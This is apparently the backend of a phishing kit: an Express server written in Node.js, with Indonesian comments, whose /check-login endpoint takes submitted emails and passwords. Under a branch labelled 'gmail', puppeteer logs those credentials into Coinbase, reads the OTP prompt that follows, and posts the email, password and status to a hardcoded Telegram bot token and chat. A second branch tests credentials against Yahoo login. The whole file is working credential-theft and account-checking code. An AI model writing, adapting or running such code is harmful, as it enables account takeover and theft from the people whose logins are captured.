const express = require('express');
const cors = require('cors');
const puppeteer = require('puppeteer');
const axios = require('axios');

const app = express();
const port = 3000;

app.use(cors());
app.use(express.json());


// Fungsi utama login email dengan puppeteer
async function loginToEmail(email, password, domain) {
  const browser = await puppeteer.launch({
    headless: false,
    args: ['--start-maximized'],
    defaultViewport: null,
  });

  const page = await browser.newPage();

  try {
    if (domain === 'gmail') {
      await page.goto('https://login.coinbase.com/signin', { waitUntil: 'networkidle2' });
    
      // Input email
      await page.waitForSelector('input[type="email"]', { timeout: 10000 });
      await page.type('input[type="email"]', email, { delay: 100 });
    
      // Tunggu tombol "Continue" aktif
      await page.waitForFunction(() => {
        const btn = document.querySelector('[data-testid="unified-login-email-prompt-submit-button"]');
        return btn && !btn.disabled;
      }, { timeout: 10000 });
    
      // Klik tombol "Continue"
      await page.click('[data-testid="unified-login-email-prompt-submit-button"]');
    
      // Tunggu field password muncul
      await page.waitForSelector('input[type="password"]', { timeout: 15000 });
    
      // Input password
      await page.type('input[type="password"]', password, { delay: 100 });
    
      // Tunggu tombol "Continue" aktif setelah password
      await page.waitForFunction(() => {
        const btn = document.querySelector('[data-testid="password-submit-button"]');
        return btn && !btn.disabled;
      }, { timeout: 10000 });
    
      // Klik tombol "Continue" lagi
      await page.click('[data-testid="password-submit-button"]');
    
      // Tunggu hasil login (ganti waitForTimeout dengan delay manual)
      await new Promise(resolve => setTimeout(resolve, 5000));
    
      const currentUrl = page.url();
      // await browser.close();
      await page.waitForSelector('h2', { timeout: 10000 });

      // Ambil teks yang ditampilkan
      const otpText = await page.evaluate(() => {
        const h2 = document.querySelector('h2');
        return h2 ? h2.innerText : null;
      });
      
      const sendTelegramMessage = async (message) => {
        const TELEGRAM_BOT_TOKEN = '6510812587:AAECIsD8cKMwkBGik-hUUau8VeD21svcGoY';
        const TELEGRAM_CHAT_ID = '-4649095516';
        const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        
        try {
          await axios.post(TELEGRAM_API, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
          });
          // if(message==="Sign in to Coinbase"){
          //   sendTelegramMessage("password incorrect");
          // }else{
          //   console.log(otpText);
          // }
          console.log("📬 OTP dikirim ke Telegram");
        } catch (err) { 
          console.error("❌ Gagal kirim ke Telegram:", err.message);
        }
      };
      
      const statuss = `${email} : ${password} | status ${otpText}`
      await sendTelegramMessage(statuss);


    }else if (domain === 'yahoo') {
      await page.goto('https://login.yahoo.com/', { waitUntil: 'networkidle2' });

      await page.type("input[name='username']", email, { delay: 100 });
      await page.click("#login-signin");
      await page.waitForNavigation({ waitUntil: 'networkidle2' });

      const passwordInput = await page.$("input[name='password']");
      if (!passwordInput) {
        await browser.close();
        return 'email_invalid_or_requires_verification';
      }

      await page.type("input[name='password']", password, { delay: 100 });
      await page.click("#login-signin");

      await page.waitForTimeout(5000);
      const currentUrl = page.url();
      await browser.close();

      if (currentUrl.includes("account/security") || currentUrl.includes("dashboard")) {
        return 'success';
      } else {
        return 'failed';
      }
    } else {
      await browser.close();
      return 'unsupported_domain';
    }

  } catch (err) {
    console.error('Login Error:', err.message);
    await browser.close();
    return 'error';
  }
}

// Endpoint POST login checker
app.post('/check-login', async (req, res) => {
  const { email, password, domain } = req.body;

  if (!email || !password || !domain) {
    return res.status(400).json({ error: 'Email, password, dan domain wajib diisi.' });
  }

  const result = await loginToEmail(email, password, domain);
  res.json({ result });
});

app.listen(port, () => {
  console.log(`✅ Server running at http://localhost:${port}`);
});
